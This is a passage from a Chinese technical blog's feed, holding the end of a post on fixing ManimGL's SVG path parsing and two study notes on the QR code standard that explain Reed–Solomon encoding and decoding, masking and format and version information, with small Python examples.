的解析器，即按照规则一个一个读取需要的数据，并且随时删掉开头的空格/逗号<br>其中读取单个浮点数用的还是上边的正则表达式</p><p>在重写了 path 解析之后，就很少因为这里出问题了</p><h2 id="正确处理-S-指令"><a href="#正确处理-S-指令" class="headerlink" title="正确处理 S 指令"></a>正确处理 S 指令</h2><p>对于下一个问题，报错出现在 <code>VMobject.get_reflection_of_last_handle</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_smooth_cubic_curve_to</span>(<span class="params">self, handle, point</span>):</span></span><br><span class="line">    self.throw_error_if_no_points()</span><br><span class="line">    new_handle = self.get_reflection_of_last_handle()</span><br><span class="line">    self.add_cubic_bezier_curve_to(new_handle, handle, point)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reflection_of_last_handle</span>(<span class="params">self</span>):</span></span><br><span class="line">    points = self.get_points()</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * points[-<span class="number">1</span>] - points[-<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>这里这样做的原因是，S 指令会把前一个点的控制点关于前一个点中心对称，作为当前点的控制点。而这里仅有一个当前点 point[-1]，而没有控制点 point[-2]，导致了 IndexError</p><p>而标准里也说了，如果 S 指令前面没有其他生成路径的指令，直接把当前点当作控制点，所以改一下就好：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> self.get_num_points() == <span class="number">1</span>:</span><br><span class="line">    new_handle = self.get_points()[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    new_handle = self.get_reflection_of_last_handle()</span><br></pre></td></tr></table></figure><hr><p>至此 SVGMobject 的 bug 基本上没剩多少了，但是还有几个标签没有实现，以及没有处理样式</p><p>而在样式处理这方面，ManimCE 做的已经很好了，打算有时间去借鉴过来 _(:з」∠)_</p><p>今天修 bug 的全部更改详见：<a href="https://github.com/3b1b/manim/pull/1712">3b1b/manim#1712</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://www.w3.org/TR/SVG/">SVG Standard</a></li><li><a href="https://github.com/cjlano/svg">cjlano/svg</a></li><li><a href="https://github.com/regebro/svg.path/">regebro/svg.path</a></li><li><a href="https://github.com/3b1b/manim/pull/1712">3b1b/manim#1712</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天一天都在修 ManimGL 里的 SVGMobject，还是比较有收获的，写篇文章记录一下&lt;br&gt;起因是 fran 给了一个在 ManimGL 里表现怪异的 svg 文件：&lt;a href=&quot;/81940d35/formula.svg&quot;&gt;formula.svg&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="manim" scheme="https://blog.tonycrane.cc/categories/manim/"/>
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/categories/manim/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="github" scheme="https://blog.tonycrane.cc/tags/github/"/>
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="manim" scheme="https://blog.tonycrane.cc/tags/manim/"/>
    
    <category term="python" scheme="https://blog.tonycrane.cc/tags/python/"/>
    
    <category term="bug" scheme="https://blog.tonycrane.cc/tags/bug/"/>
    
  </entry>
  
  <entry>
    <title>「QRCode 标准阅读」#3 解码纠错过程</title>
    <link href="https://blog.tonycrane.cc/p/12ee036b.html"/>
    <id>https://blog.tonycrane.cc/p/12ee036b.html</id>
    <published>2021-12-01T14:14:41.000Z</published>
    <updated>2021-12-01T14:45:57.109Z</updated>
    
    <content type="html"><![CDATA[<p><a href="/p/f956b4.html">&lt; #2</a></p><h2 id="解码（11、Annex-B）"><a href="#解码（11、Annex-B）" class="headerlink" title="解码（11、Annex B）"></a>解码（11、Annex B）</h2><p>简要的解码过程：</p><ol><li>定位并获取图像中的二维码，并把图像中的黑白块提取为 1 和 0</li><li>读取格式信息<span id="more"></span><ul><li>释放掩码 <code>101010000010010</code></li><li>进行纠错</li><li>如果纠错失败则将二维码镜面对称再尝试</li></ul></li><li>读取版本信息（如果有的话）</li><li>读取格式信息中的掩码编号，并释放掩码</li><li>读取并恢复数据字和纠错字</li><li>纠错，如果检测到了错误就纠正</li><li>把数据字解码得到结果</li></ol><h3 id="纠错（Annex-B）"><a href="#纠错（Annex-B）" class="headerlink" title="纠错（Annex B）"></a>纠错（Annex B）</h3><p>Annex B 讲的纠错过程很简略，而且符号说明不全，很难看懂</p><p>去学了学 PGZ 解码：<a href="https://en.wikipedia.org/wiki/Reed%E2%80%93Solomon_error_correction#Peterson%E2%80%93Gorenstein%E2%80%93Zierler_decoder">Reed–Solomon_error_correction#Peterson–Gorenstein–Zierler_decoder</a></p><p>设当前版本下每块中有 $n$ 个字，$k$ 个数据字，$n-k$ 个纠错字，纠错容量为 $\nu$</p><p>首先定义原来的完整数据（即数据字和纠错字）从高位到低位为 $c_{n-1},c_{n-2},\cdots,c_0$ ，对应多项式为：</p><p>$$s(x)=\sum_{i=0}^{n-1}c_ix^i=c_{n-1}x^{n-1}+c_{n-2}x^{n-2}+\cdots+c_0$$</p><p>而且根据纠错码生成原理，$s(x)$ 可以被生成多项式 $g(x)$ 整除，其中</p><p>$$g(x)=\prod_{i=0}^{n-k-1}(x-\alpha^i)$$</p><p>所以 $s(x)$ 也有根 $s(\alpha^i)=0, i=0,1,\dots n-k-1$</p><p>再设接收到的消息多项式（可能有错）为 $r(x)$ ，误差多项式为 $e(x)$ ，满足：</p><p>$$r(x)=s(x)+e(x),\quad e(x)=\sum_{i=0}^{n-1}e_ix^i$$</p><p>先设一共有 $\nu$ 个错误，且每个错误的位置为 $i_k,k=0,1,\dots \nu-1$，所以有：</p><p>$$e(x)=\sum_{k=0}^{\nu-1}e_{i_k}x^{i_k}$$</p><p>最终的目标就是找到错误个数 $\nu$，错误位置 $i_k$，以及错误大小 $e_{i_k}$</p><h4 id="计算典型值"><a href="#计算典型值" class="headerlink" title="计算典型值"></a>计算典型值</h4><p>首先定义典型值（syndromes）为把 $\alpha^j$ 传入 $r(x)$ 得到的值 $S_j$，有：</p><p>$$S_j=r(\alpha^j)=s(\alpha^j)+e(\alpha^j)=e(\alpha^j)=\sum_{k=0}^{\nu-1}e_{i_k}(\alpha^j)^{i_k},j=0,1,\dots,n-k-1$$</p><p>此时如果得到的典型值都为 0，那说明没有错误</p><p>为了方便，再令 $X_k=\alpha^{i_k},Y_k=e_{i_k}$，这样 $X_k$ 也能用来定位错误，同时也有：</p><p>$$S_j=\sum_{k=0}^{\nu-1}Y_kX_k^j$$</p><p>写成矩阵形式就是：</p><p>$$<br>\begin{bmatrix}<br>X_0^0 &amp;X_2^0 &amp;\cdots &amp;X_{\nu-1}^0\\<br>X_0^1 &amp;X_1^1 &amp;\cdots &amp;X_{\nu-1}^1\\<br>\vdots &amp;\vdots &amp; &amp;\vdots\\<br>X_0^{n-k-1} &amp;X_1^{n-k-1} &amp;\cdots &amp;X_{\nu-1}^{n-k-1}<br>\end{bmatrix}<br>\begin{bmatrix}<br>Y_0\\Y_1\\\vdots\\Y_{\nu-1}<br>\end{bmatrix}=<br>\begin{bmatrix}<br>S_0\\S_1\\\vdots\\S_{n-k-1}<br>\end{bmatrix}<br>$$</p><p>所以只要求得位置 $X_k$ 就能得到错误大小，但是此时并不是线性的</p><h4 id="错误定位多项式"><a href="#错误定位多项式" class="headerlink" title="错误定位多项式"></a>错误定位多项式</h4><p>定义一个错误定位多项式（error locator polynomial）$\Lambda(x)$：</p><p>$$\Lambda(x)=\prod_{k=0}^{\nu-1}(1-xX_k)=1+\Lambda_1x+\Lambda_2x^2+\cdots+\Lambda_\nu x^\nu$$</p><p>可以看出 $\Lambda(X_k^{-1})=0$，所以对于 $0\leq j\leq\nu-1$ 有：</p><p>$$<br>Y_kX_k^{j+\nu}\Lambda(X_k^{-1}) =0<br>$$</p><p>$$<br>Y_{k}X_{k}^{j+\nu }(1+\Lambda _{1}X_{k}^{-1}+\Lambda _{2}X_{k}^{-2}+\cdots +\Lambda _{\nu }X_{k}^{-\nu })=0<br>$$</p><p>$$<br>Y_{k}X_{k}^{j+\nu }+\Lambda _{1}Y_{k}X_{k}^{j+\nu }X_{k}^{-1}+\Lambda _{2}Y_{k}X_{k}^{j+\nu }X_{k}^{-2}+\cdots +\Lambda _{\nu }Y_{k}X_{k}^{j+\nu }X_{k}^{-\nu }=0<br>$$</p><p>$$<br>Y_{k}X_{k}^{j+\nu }+\Lambda _{1}Y_{k}X_{k}^{j+\nu -1}+\Lambda _{2}Y_{k}X_{k}^{j+\nu -2}+\cdots +\Lambda _{\nu }Y_{k}X_{k}^{j}=0<br>$$</p><p>所以把 $k$ 从 $0$ 到 $\nu-1$ 累加起来也为 0：</p><p>$$\sum_{k=0}^{\nu-1}\left(Y_{k}X_{k}^{j+\nu }+\Lambda _{1}Y_{k}X_{k}^{j+\nu -1}+\Lambda _{2}Y_{k}X_{k}^{j+\nu -2}+\cdots +\Lambda _{\nu }Y_{k}X_{k}^{j}\right)=0$$</p><p>然后转换为每项累加并提取出 $\Lambda_i$：</p><p>$$\left(\sum _{k=1}^{\nu }Y_{k}X_{k}^{j+\nu }\right)+\Lambda _{1}\left(\sum _{k=1}^{\nu }Y_{k}X_{k}^{j+\nu -1}\right)+\cdots +\Lambda _{\nu }\left(\sum _{k=1}^{\nu }Y_{k}X_{k}^{j}\right)=0$$</p><p>根据典型值的定义有：</p><p>$$S_{j+\nu}+\Lambda_1S_{j+\nu-1}+\cdots+\Lambda_\nu S_k=0$$</p><p>把 $S_{j+\nu}$ 移到右边，并展开所有 $j$ 可以得到矩阵形式：</p><p>$$<br>\begin{bmatrix}<br>S_{0}&amp;S_{1}&amp;\cdots &amp;S_{\nu-1}\\S_{1}&amp;S_{2}&amp;\cdots &amp;S_{\nu}\\\vdots &amp;\vdots &amp;&amp;\vdots \\S_{\nu-1}&amp;S_{\nu}&amp;\cdots &amp;S_{2\nu -2}<br>\end{bmatrix}<br>\begin{bmatrix}\Lambda _{\nu }\\\Lambda _{\nu -1}\\\vdots \\\Lambda _{1}<br>\end{bmatrix}<br>=<br>\begin{bmatrix}<br>-S_{\nu}\\-S_{\nu +1}\\\vdots \\-S_{2\nu-1 }<br>\end{bmatrix}<br>$$</p><p>此时是一个线性方程组，而且 $S_i$ 全部已知，可以解得 $\Lambda_i$</p><h4 id="得到错误位置和大小"><a href="#得到错误位置和大小" class="headerlink" title="得到错误位置和大小"></a>得到错误位置和大小</h4><p>此时多项式 $\Lambda(x)$  已经完全已知，所以可以求得其根（用 Chien search 算法在伽罗瓦域上求根）</p><p>再算其倒数即可得到 $X_k$ ，然后可以寻找到错误位置 $i_k$</p><p>这时也就可以带入第一个方程组求得错误大小 $Y_k$（或者利用 Forney algorithm）</p><p>得到了 $e(x)$ 后就可以根据 $r(x)$ 算出原始信息 $s(x)$ 了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;/p/f956b4.html&quot;&gt;&amp;lt; #2&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;解码（11、Annex-B）&quot;&gt;&lt;a href=&quot;#解码（11、Annex-B）&quot; class=&quot;headerlink&quot; title=&quot;解码（11、Annex B）&quot;&gt;&lt;/a&gt;解码（11、Annex B）&lt;/h2&gt;&lt;p&gt;简要的解码过程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;定位并获取图像中的二维码，并把图像中的黑白块提取为 1 和 0&lt;/li&gt;
&lt;li&gt;读取格式信息&lt;/li&gt;&lt;/ol&gt;</summary>
    
    
    
    
    <category term="笔记" scheme="https://blog.tonycrane.cc/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>「QRCode 标准阅读」#2 纠错码编码与图像生成</title>
    <link href="https://blog.tonycrane.cc/p/f956b4.html"/>
    <id>https://blog.tonycrane.cc/p/f956b4.html</id>
    <published>2021-12-01T14:14:17.000Z</published>
    <updated>2021-12-01T15:02:30.141Z</updated>
    
    <content type="html"><![CDATA[<div style="display: flex; justify-content: space-between;"><p><a href="/p/1c1e6bbc.html">&lt; #1</a></p><p><a href="/p/12ee036b.html">#3 &gt;</a></p></div><h2 id="纠错码编码（7-5）"><a href="#纠错码编码（7-5）" class="headerlink" title="纠错码编码（7.5）"></a>纠错码编码（7.5）</h2><h3 id="纠错容量（7-5-1）"><a href="#纠错容量（7-5-1）" class="headerlink" title="纠错容量（7.5.1）"></a>纠错容量（7.5.1）</h3><p>纠错字（error correction codewords）可以纠正两种错误，一种是比如无法扫描或无法解码的已知位置的错误字（erasures），一种是未知位置的错误字（errors），一个 erasures 可以由一个纠错字纠错，而一个 errors 需要两个纠错字来纠错</p><span id="more"></span><p>可以纠错的 erasures 和 errors 的数量满足：</p><p>$$e+2t\leq d-p$$</p><p>其中 $e$ 是 erasures 的数量，$t$ 是 errors 的数量，$d$ 是纠错字的数量，$p$ 是被错误解析的保护字数量</p><p>其中 $p$ 由版本决定：</p><ul><li>$p=3$：版本 1-L</li><li>$p=2$：版本 1-M、2-L</li><li>$p=1$：版本 1-Q、1-H、3-L</li><li>$p=0$：其他所有版本</li></ul><h4 id="分块编码纠错码"><a href="#分块编码纠错码" class="headerlink" title="分块编码纠错码"></a>分块编码纠错码</h4><p>根据版本号及纠错等级，数据序列需要被分成 1 个或多个块，每块内需要单独编码纠错码</p><p>如果需要补充的话一律全部补充 0 比特到需要的长度</p><p>具体不同版本的分块块数和每块中数量安排以及纠错容量都在文档中 P38-44（pdf 中 P46-52）的大表格 Table 9 中</p><h3 id="生成纠错码（7-5-2）"><a href="#生成纠错码（7-5-2）" class="headerlink" title="生成纠错码（7.5.2）"></a>生成纠错码（7.5.2）</h3><h4 id="伽罗瓦域"><a href="#伽罗瓦域" class="headerlink" title="伽罗瓦域"></a>伽罗瓦域</h4><p>生成纠错码之前要先将所有数据字转换成一个多项式，使其限制于伽罗瓦域 $GF(2^3)\bmod 100011101$ 中，而且后续的四则运算也都是该伽罗瓦域中的运算</p><p>具体伽罗瓦域的生成原理可以看：<a href="https://www.codenong.com/cs105738710/">https://www.codenong.com/cs105738710/</a></p><p>简单来说就是多项式的加减法都是异或，乘除法要每一个比特模 2，每一个字节模 100011101（即该伽罗瓦域中的本原多项式 $x^8+x^4+x^3+x^2+1$）</p><p>具体多项式 mod 运算的方法可以看：<a href="https://blog.csdn.net/yaongtime/article/details/17200401">https://blog.csdn.net/yaongtime/article/details/17200401</a></p><p>简单来说就是多项式的长除法取模，而且注意这里的加减都是伽罗瓦域中的加减，即异或</p><h4 id="生成多项式（Annex-A）"><a href="#生成多项式（Annex-A）" class="headerlink" title="生成多项式（Annex A）"></a>生成多项式（Annex A）</h4><p>纠错码生成多项式的一般表达形式是：</p><p>$$g(x)=(x-\alpha^0)(x-\alpha^1)\cdots(x-\alpha^{n-1})$$</p><p>其中 $n$ 为纠错码字的个数，其中 $\alpha=2$， $\alpha^k$ 的是在伽罗瓦域下的运算，即：</p><p>$\alpha^0 = 1;\ \alpha^1=2;\ \alpha^2=4;\ \cdots;\ \alpha^7=128$</p><p>$\alpha^8=256\bmod 285=256\oplus 285=29;\ \alpha^9=29\times2=58;\ \cdots$</p><p>具体计算 $\alpha^k$ 的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alpha</span>(<span class="params">k</span>):</span></span><br><span class="line">    res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        res *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> res &gt;= <span class="number">256</span>:</span><br><span class="line">            res ^= <span class="number">285</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>文档附录 A 中已经展开了所有可能 $n$ 值下的36个生成多项式</p><h4 id="生成纠错码"><a href="#生成纠错码" class="headerlink" title="生成纠错码"></a>生成纠错码</h4><p>文档里给了一个感觉比较晦涩难懂的图来展示生成纠错码的过程：</p><p><img src="/p/f956b4/ecgen.png"></p><p>不是很容易理解，于是找了另一篇文章：<a href="https://blog.csdn.net/ljm1995/article/details/88819664">https://blog.csdn.net/ljm1995/article/details/88819664</a></p><p>举个例子，比如要编码 12345678 这八个数字</p><p>版本 1-L，查 Table 9 得到分为 1 块，且该块内总字数为 26，数据字数为 19，纠错字数为 26-19=7</p><p>根据前面所说，比特流应该是： <code>0001 0000001000 0001111011 0111001000 1001110 0000</code></p><p>补成 8 的倍数长度： <code>00010000 00100000 01111011 01110010 00100111 00000000</code></p><p>添加 padding bits（补到 19 个字节）： <code>00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100</code></p><p>写成多项式形式，次数是 19 次，整体乘 $x^7$：</p><p>$$16x^{25}+32x^{24}+123x^{23}+114x^{22}+39x^{21}+236x^{19}+\\17x^{18}+236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}$$</p><p>再查附录 A 得到次数为 7 的生成多项式，并整体乘 $x^{18}$：</p><p>$$x^{25}+\alpha^{87}x^{24}+\alpha^{229}x^{23}+\alpha^{146}x^{22}+\alpha^{149}x^{21}+\\\alpha^{238}x^{20}+\alpha^{102}x^{19}+\alpha^{21}x^{18}$$</p><p>然后把第一个多项式除第二个多项式取余数</p><p>可以这样计算，把第二个多项式整体乘 16 即 $\alpha^4$：</p><p>$$\alpha^4x^{25}+\alpha^{91}x^{24}+\alpha^{233}x^{23}+\alpha^{150}x^{22}+\alpha^{153}x^{21}+\\\alpha^{242}x^{20}+\alpha^{106}x^{19}+\alpha^{25}x^{18}$$</p><p>计算出系数的值：</p><p>$$16x^{25}+163x^{24}+243x^{23}+85x^{22}+146x^{21}+\\176x^{20}+52x^{19}+3x^{18}$$</p><p>之后与第一个多项式异或得到：</p><p>$$131x^{24}+136x^{23}+197x^{22}+181x^{21}+216x^{19}+18x^{18}+\\236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}$$</p><p>这之后最高次就变成了 24 次，重复整个过程直到结果只剩下 7 项（即最高次为 6 次）时即可得到：</p><p>$$188x^6+247x^5+62x^4+248x^3+53x^2+170x+224$$</p><p>所以纠错码就是：<code>188 247 62 248 53 170 224</code></p><p>转为二进制： <code>10111100 11110111 00111110 11111000 00110101 10101010 11100000</code></p><blockquote><p>所以整个二维码的编码区域（除格式信息外）全部内容就是： <code>00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 10111100 11110111 00111110 11111000 00110101 10101010 11100000</code></p></blockquote><p>纠错码可以直接用 python 的 reedsolo 包来求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> reedsolo <span class="keyword">import</span> RSCodec, ReedSolomonError</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rsc = RSCodec(<span class="number">7</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(rsc.encode([<span class="number">16</span>, <span class="number">32</span>, <span class="number">123</span>, <span class="number">114</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>]))</span><br><span class="line">[<span class="number">16</span>, <span class="number">32</span>, <span class="number">123</span>, <span class="number">114</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">188</span>, <span class="number">247</span>, <span class="number">62</span>, <span class="number">248</span>, <span class="number">53</span>, <span class="number">170</span>, <span class="number">224</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(rsc.encode([<span class="number">16</span>, <span class="number">32</span>, <span class="number">123</span>, <span class="number">114</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>, <span class="number">17</span>, <span class="number">236</span>]))[-<span class="number">7</span>:]</span><br><span class="line">[<span class="number">188</span>, <span class="number">247</span>, <span class="number">62</span>, <span class="number">248</span>, <span class="number">53</span>, <span class="number">170</span>, <span class="number">224</span>]</span><br></pre></td></tr></table></figure><h2 id="剩余步骤（7-6-7-10）"><a href="#剩余步骤（7-6-7-10）" class="headerlink" title="剩余步骤（7.6~7.10）"></a>剩余步骤（7.6~7.10）</h2><h3 id="合成序列（7-6）"><a href="#合成序列（7-6）" class="headerlink" title="合成序列（7.6）"></a>合成序列（7.6）</h3><p>首先按照 2 中所述给完整信息编码成数据序列，其中也包含 padding bits，且长度为 8 的倍数</p><p>然后根据 3.1.1 中所说对数据序列进行分块，然后对每块分别生成纠错码</p><p>最后把数据序列的所有块按照字节依次交错合成新的数据序列，然后把纠错码的所有块按照字节交错合成纠错码序列。把新的数据序列和纠错码序列连接在一起，如果总长度不够二维码的容量，则在后面补充 3/4/7 个 0 比特（需要补多少在 Table 1 中有定义）</p><p>而且这样也要保证最短的数据块在最前面（已经由 Table 9 定义）</p><p>比如 5-H 版本的序列，需要分为 4 块，前两块是 11 个数据字、22 个纠错字，后两块是 12 个数据字、22 个纠错字：</p><p><img src="/p/f956b4/a.png"></p><p>最后的序列就是 $D_1,D_{12},D_{23},D_{35},\cdots,D_{45},D_{34},D_{46},E_1,E_{23},\cdots,E_{88}$</p><h3 id="填充数据（7-7）"><a href="#填充数据（7-7）" class="headerlink" title="填充数据（7.7）"></a>填充数据（7.7）</h3><p>把前面合成的完整消息序列填到二维码中，首先要先填充功能图案，然后预留出格式信息、版本信息的位置</p><p>填充时以两列为单位，即每次交替填充两列。从最右下角开始是最高位的比特，然后从右向左从下向上交替填充，到了上界时左转向下继续填充，遇到对齐图案直接穿过，遇到对齐图案边界则变为一行</p><p>也可以按照字节来依次填充，如果是向上填充，则最高位在下端，反之在上段。每个字节块内的最高位尽量取最右侧的，但如果最下(上)端只有一个比特的位置，则选它作为最高比特的位置</p><p>反正按顺序正常填就行了，遇到东西就绕</p><p><img src="/p/f956b4/Untitled%206.png"></p><p><img src="/p/f956b4/Untitled%207.png"></p><p><img src="/p/f956b4/Untitled%208.png"></p><p><img src="/p/f956b4/Untitled%209.png"></p><p><img src="/p/f956b4/Untitled%2010.png"></p><h3 id="掩码遮盖（7-8）"><a href="#掩码遮盖（7-8）" class="headerlink" title="掩码遮盖（7.8）"></a>掩码遮盖（7.8）</h3><p>填充后的数据还要遮盖一层掩码（异或）来平衡黑白块的数量，以及减少容易产生扫描错误的大块和形似功能图案的部分出现</p><p>QR 码一共有 8 种掩码，每个掩码有一个 3 bits 的编号，和一个生成公式。这个公式用来生成掩码图样，以左上为原点，向右、下为正方向，坐标满足这个公式的点在图样中是黑色（1），不满足的是白色（0）。在版本 1 中的掩码图像表现为：</p><p><img src="/p/f956b4/Untitled%2011.png"></p><p>进行掩码操作就是把除去功能图案和版本信息、格式信息之外的数据部分每一块的值与掩码图样异或</p><p>整个操作需要生成分别使用不同掩码的 8 个图样，然后计算出损失分数（penalty points score），然后采用损失分数最小的掩码模式作为最终的掩码模式</p><h4 id="计算损失分数（7-8-3）"><a href="#计算损失分数（7-8-3）" class="headerlink" title="计算损失分数（7.8.3）"></a>计算损失分数（7.8.3）</h4><p>虽然进行掩码操作时仅对非功能图案、非版本信息格式信息的数据区域进行掩码，但是计算损失分数时按照整个二维码计算</p><p>计算损失分有四个规则：</p><ul><li>相邻一行或一列内出现连续五个相同颜色块时损失分 +3，之后连续块数每加一，损失分 +1</li><li>寻找内部颜色相同的 2*2 的块，每出现一个损失分 +3</li><li>在每行和每列中寻找 <code>10111010000</code> 和 <code>00001011101</code> ，每出现一个损失分 +40</li><li>评估黑色块占全部块数的比例，如果在 45%~55% 间则不增加损失分，在 40%~45%、55%~60% 间则损失分 +10，在 35%~40%、60%~65% 间则损失分 +10*2，以此类推</li></ul><p>更详细的例子可以看：<a href="https://www.thonky.com/qr-code-tutorial/data-masking">https://www.thonky.com/qr-code-tutorial/data-masking</a></p><p>然后对所有掩码结果计算损失分数后选择分数最低的一个作为最终结果</p><h3 id="格式信息（7-9）"><a href="#格式信息（7-9）" class="headerlink" title="格式信息（7.9）"></a>格式信息（7.9）</h3><p>QRCode 的格式信息是 15 bits 的序列，其中前 5 位是数据，后 10 位是针对格式信息的纠错码（由 (15, 5) BCH 码生成）</p><p>5 bits 的数据前 2 位是纠错等级标识符，分别是 L -&gt; <code>01</code> 、M -&gt; <code>00</code> 、Q -&gt; <code>11</code> 、H -&gt; <code>10</code></p><p>后 3 位是上面说到的掩码编号</p><p>然后后接 10 bits 纠错码，最后整体异或 <code>101010000010010</code> 防止产生全零数据序列</p><h4 id="生成纠错码（Annex-C）"><a href="#生成纠错码（Annex-C）" class="headerlink" title="生成纠错码（Annex C）"></a>生成纠错码（Annex C）</h4><p>先得到前 5 bits 的数据，然后化为多项式，整体乘 $x^{10}$，再除以生成多项式 $G(x)=x^{10}+x^8+x^5+x^4+x^2+x+1$ 得到余数转换为后 10 bits 的纠错码</p><ul><li><strong>例子</strong><ul><li>纠错等级 M，掩码编号 101</li><li>5 bits 数据： <code>00101</code></li><li>写为多项式： $x^2+1$</li><li>整体乘 $x^{10}$： $x^{12}+x^{10}$</li><li>除以 $G(x)$： 商 $x^2$，余数 $x^7+x^6+x^4+x^3+x^2$</li><li>余数转为 10 bits 纠错码： <code>0011011100</code></li><li>加上原数据： <code>001010011011100</code></li><li>异或 <code>101010000010010</code>： <code>100000011001110</code></li></ul></li></ul><p>因为 5 bits 的数据一共只有 32 种情况，所以附录 C 中直接给出了完整的表格：</p><p><img src="/p/f956b4/TableC1.png" alt="Table C.1 全部可能格式信息"></p><p><strong>纠错</strong>：最多可以纠正 3 bits 的错误，先把格式信息异或 <code>101010000010010</code> 得到原始序列，然后与 Table C.1 中的有效格式信息进行对比，如果找不到说明有错误。此时仅选择 Table C.1 中与错误格式信息相差比特最少的一个作为纠正后的格式信息即可，如果相差少于等于 3 个比特，则视为纠正成功</p><h4 id="填入二维码"><a href="#填入二维码" class="headerlink" title="填入二维码"></a>填入二维码</h4><p>左上角的格式信息区域填充一份完整的格式信息（最高位在左），左下角和右上角合起来是一份完整的格式信息（最高位在左下角的最下，最低位在右上角的最右）。并且左下角的格式信息上方（位置<code>(4V+9,8)</code>）有一块始终是黑色：</p><p><img src="/p/f956b4/Untitled%2018.png"></p><h3 id="版本信息（7-10）"><a href="#版本信息（7-10）" class="headerlink" title="版本信息（7.10）"></a>版本信息（7.10）</h3><p>在版本 7 及以上的二维码中需要填入版本信息来确保准确度</p><p>版本信息只储存了该二维码的版本号（7～40），一共 18 bits，前 6 bits 为版本号的二进制（从 <code>000111</code> 到 <code>101000</code>），后 12 bits 为由 (18, 6) Golay code 生成的纠错码</p><p>不同于格式信息，因为版本号不会出现全零，所以不需要进行掩码操作</p><h4 id="生成纠错码（Annex-D）"><a href="#生成纠错码（Annex-D）" class="headerlink" title="生成纠错码（Annex D）"></a>生成纠错码（Annex D）</h4><p>和格式信息的纠错码类似，先把前 6 bits 转为多项式，然后整体乘 $x^{12}$，得到的结果除以生成多项式 $G(x)=x^{12}+x^{11}+x^{10}+x^9+x^8+x^5+x^2+x^1$ ，把余数转为 12 bits 二进制就是纠错码了</p><p>因为只有 34 个版本有版本信息，所以也就只有 34 种有效的版本信息序列，附录 D 的 Table D.1 中给出了完整的 34 个版本信息序列</p><p><img src="/p/f956b4/TableD1.png" alt="Table D.1 全部有效版本信息序列"></p><p>和格式信息一样，纠错时对照表格选择相差比特数最小的即可。并且版本信息也只能纠正小于等于 3 个错误</p><h4 id="填入二维码-1"><a href="#填入二维码-1" class="headerlink" title="填入二维码"></a>填入二维码</h4><p>在版本 7 以上的二维码中已经预留出了两个 6*3 大小的区域，一个位于左下分割线的上方时序图案左侧，一个位于右上分割线左侧时序图案的上方</p><p>按照下图顺序填入即可：</p><p><img src="/p/f956b4/Untitled%2020.png"></p><hr><p>未完待续……<a 